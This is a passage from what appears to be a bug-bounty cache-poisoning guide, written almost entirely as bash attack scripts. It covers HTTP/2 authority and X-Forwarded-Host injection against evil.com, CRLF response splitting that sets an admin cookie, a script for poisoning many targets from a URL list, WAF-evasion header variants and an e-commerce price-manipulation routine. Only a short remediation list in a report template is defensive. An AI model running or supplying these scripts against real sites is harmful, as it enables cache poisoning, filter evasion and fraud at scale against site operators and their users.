# HTTP/2 specific cache poisoning techniques
test_http2_cache_poisoning() {
    local target=$1
    echo "🚀 Testing HTTP/2 cache poisoning for $target"
    
    # HTTP/2 specific headers
    curl -s --http2 "$target/" \
        -H ":authority: evil.com" \
        -H ":method: GET" \
        -H ":path: /" \
        -H ":scheme: https" \
        > http2_poison_test.txt
    
    if grep -q "evil.com" http2_poison_test.txt; then
        echo "✅ HTTP/2 cache poisoning successful!"
    fi
}
```

#### 3. Cache Poisoning via Vary Header Manipulation
```bash
# Vary header manipulation for cache poisoning
test_vary_header_manipulation() {
    local target=$1
    echo "🔄 Testing Vary header manipulation for $target"
    
    # Test different User-Agent values if Vary: User-Agent is set
    user_agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        "CachePoisoningBot/1.0"
        "EvilBot/1.0"
    )
    
    for ua in "${user_agents[@]}"; do
        echo "🔍 Testing User-Agent: $ua"
        
        # Send request with malicious header and specific User-Agent
        curl -s "$target/" \
            -H "User-Agent: $ua" \
            -H "X-Forwarded-Host: evil.com" \
            > "vary_test_$(echo $ua | tr ' /' '_').txt"
        
        # Check if poisoning worked for this User-Agent
        if grep -q "evil.com" "vary_test_$(echo $ua | tr ' /' '_').txt"; then
            echo "✅ Vary header cache poisoning with UA: $ua"
        fi
        
        sleep 1
    done
}
```

## 🎪 Phase 5: Mass Cache Poisoning Testing

### Multi-Target Cache Poisoning
```bash
#!/bin/bash
# Mass cache poisoning testing across multiple targets
# Save as mass_cache_poison.sh

mass_cache_poisoning() {
    local targets_file=$1
    
    if [[ ! -f "$targets_file" ]]; then
        echo "Usage: ./mass_cache_poison.sh targets.txt"
        echo "Create targets.txt with one URL per line"
        exit 1
    fi
    
    echo "🎯 Starting mass cache poisoning testing..."
    mkdir -p mass_cache_results
    cd mass_cache_results
    
    # Process each target
    while read -r target; do
        if [[ ! -z "$target" && ! "$target" =~ ^# ]]; then
            echo "🔍 Testing target: $target"
            
            # Create target-specific directory
            target_dir=$(echo "$target" | sed 's|https\?://||' | tr '/' '_')
            mkdir -p "$target_dir"
            cd "$target_dir"
            
            # Quick cache poisoning test
            quick_cache_test() {
                # Test most effective headers
                effective_headers=(
                    "X-Forwarded-Host: evil.com"
                    "Host: evil.com"
                    "X-Original-URL: /admin"
                )
                
                for header in "${effective_headers[@]}"; do
                    # Send poisoning request
                    curl -s "$target/" -H "$header" > /dev/null
                    sleep 1
                    
                    # Check if cache is poisoned
                    response=$(curl -s "$target/")
                    if echo "$response" | grep -q "evil.com\|admin"; then
                        echo "✅ Quick cache poisoning: $target with $header"
                        echo "$target|$header|$(date)" >> ../quick_cache_findings.txt
                        break
                    fi
                done
            }
            
            # Run quick test
            quick_cache_test
            
            cd ..
        fi
    done < "$targets_file"
    
    cd ..
    
    echo "✅ Mass cache poisoning testing completed!"
    if [[ -f mass_cache_results/quick_cache_findings.txt ]]; then
        echo "📊 Found $(wc -l < mass_cache_results/quick_cache_findings.txt) potential cache poisoning vulnerabilities"
    fi
}

# Create sample targets file
cat > sample_targets.txt << 'EOF'
# Add your targets here, one per line
# https://target1.com
# https://target2.com
# https://api.target3.com
EOF

echo "📝 Sample targets file created: sample_targets.txt"
echo "🚀 Usage: ./mass_cache_poison.sh sample_targets.txt"
```

## 🔥 Elite Cache Poisoning Cheat Sheet

### Quick Commands for Manual Testing:
```bash
# 1. Basic Host header injection
curl -H "Host: evil.com" https://target.com/

# 2. X-Forwarded-Host injection
curl -H "X-Forwarded-Host: evil.com" https://target.com/

# 3. Cache deception
curl https://target.com/api/user/profile.css

# 4. Response splitting
curl "https://target.com/?redirect=test%0d%0aSet-Cookie:%20admin=true"

# 5. Multiple header injection
curl -H "Host: evil.com" -H "X-Forwarded-Host: evil.com" https://target.com/

# 6. Cache bypass testing
curl -H "Cache-Control: no-cache" https://target.com/static/app.js

# 7. HTTP/2 authority injection
curl --http2 -H ":authority: evil.com" https://target.com/
```

### Impact Assessment:
- **Critical ($1000+)**: Password reset manipulation, Admin panel access
- **High ($500+)**: User data exposure, API manipulation
- **Medium ($200+)**: Static content poisoning, Information disclosure
- **Low ($100+)**: Cache bypass, Minor header reflection

## 🛡️ Detection Evasion Techniques

### WAF Bypass for Cache Poisoning:
```bash
# WAF bypass techniques for cache poisoning
waf_bypass_cache_poison() {
    local target=$1
    
    # Obfuscated headers
    obfuscated_headers=(
        "X-Forwarded-Host: evil.com"
        "X-Forwarded-Host:evil.com"           # No space
        "X-Forwarded-Host:\tevil.com"         # Tab instead of space
        "X-Forwarded-Host: \tevil.com"        # Tab in value
        "X-Forwarded-Host:  evil.com"         # Double space
        "x-forwarded-host: evil.com"          # Lowercase
        "X-FORWARDED-HOST: evil.com"          # Uppercase
        "X-Forwarded-Host: evi%6c.com"        # URL encoded
        "X-Forwarded-Host: evil.com\x00"      # Null byte
    )
    
    for header in "${obfuscated_headers[@]}"; do
        echo "🔍 Testing obfuscated header: $header"
        curl -s "$target/" -H "$header" > "waf_bypass_$(date +%s).txt"
        
        if grep -q "evil.com\|evi.*com" "waf_bypass_$(date +%s).txt"; then
            echo "✅ WAF bypass successful with: $header"
        fi
        
        sleep 0.5
    done
}
```

## 📊 Results Analysis & Verification

### Automated Results Analyzer
```bash
# Analyze all cache poisoning results
analyze_cache_results() {
    echo "📊 Analyzing cache poisoning results..."
    
    # Count total findings
    total_findings=0
    
    if [[ -f cache_poisoning_found.txt ]]; then
        cache_count=$(wc -l < cache_poisoning_found.txt)
        echo "🗄️ Cache poisoning: $cache_count findings"
        total_findings=$((total_findings + cache_count))
    fi
    
    if [[ -f host_injection_found.txt ]]; then
        host_count=$(wc -l < host_injection_found.txt)
        echo "🏠 Host injection: $host_count findings"
        total_findings=$((total_findings + host_count))
    fi
    
    if [[ -f critical_findings.txt ]]; then
        critical_count=$(wc -l < critical_findings.txt)
        echo "🚨 Critical findings: $critical_count"
    fi
    
    echo "📈 Total cache-related vulnerabilities: $total_findings"
    
    # Generate final report
    cat > final_cache_report.md << EOF
# Cache Poisoning & Header Injection Test Report

## Target: $TARGET
## Date: $(date)
## Total Findings: $total_findings

### Critical Findings:
$(if [[ -f critical_findings.txt ]]; then cat critical_findings.txt; else echo "None"; fi)

### Cache Poisoning Findings:
$(if [[ -f cache_poisoning_found.txt ]]; then cat cache_poisoning_found.txt; else echo "None"; fi)

### Host Header Injection Findings:
$(if [[ -f host_injection_found.txt ]]; then cat host_injection_found.txt; else echo "None"; fi)

## Recommendations:
1. Implement proper cache key validation
2. Sanitize and validate all HTTP headers
3. Use allowlists for trusted hosts
4. Implement proper cache controls
5. Monitor for cache poisoning attempts

EOF
    
    echo "📄 Final report generated: final_cache_report.md"
}

# Usage
analyze_cache_results
```

## 🎯 Real-World Attack Scenarios

### Scenario: E-commerce Price Manipulation via Cache
```bash
# E-commerce cache poisoning for price manipulation
ecommerce_cache_attack() {
    local target=$1
    echo "🛒 Testing e-commerce cache poisoning for $target"
    
    # Test product price manipulation
    product_endpoints=(
        "/api/product/123"
        "/api/products/456"
        "/product/789"
        "/shop/item/101"
    )
    
    for endpoint in "${product_endpoints[@]}"; do
        echo "💰 Testing price manipulation: $target$endpoint"
        
        # Send request with price manipulation header
        curl -s "$target$endpoint" \
            -H "X-Forwarded-Host: evil.com" \
            -H "X-Price-Override: 0.01" \
            -H "X-Discount: 99" \
            > "product_poison_$(basename $endpoint).txt"
        
        # Check if price was manipulated in cache
        sleep 2
        normal_response=$(curl -s "$target$endpoint")
        
        if echo "$normal_response" | grep -q "0.01\|evil.com"; then
            echo "✅ E-commerce cache poisoning successful!"
            echo "$target$endpoint|PRICE_MANIPULATION|$(date)" >> ecommerce_cache_findings.txt
        fi
    done
}
```

Yeh comprehensive cache poisoning aur header injection methodology hai jo elite hackers use karte hain. Isme sare advanced techniques, automation tools, aur real-world scenarios covered hain!
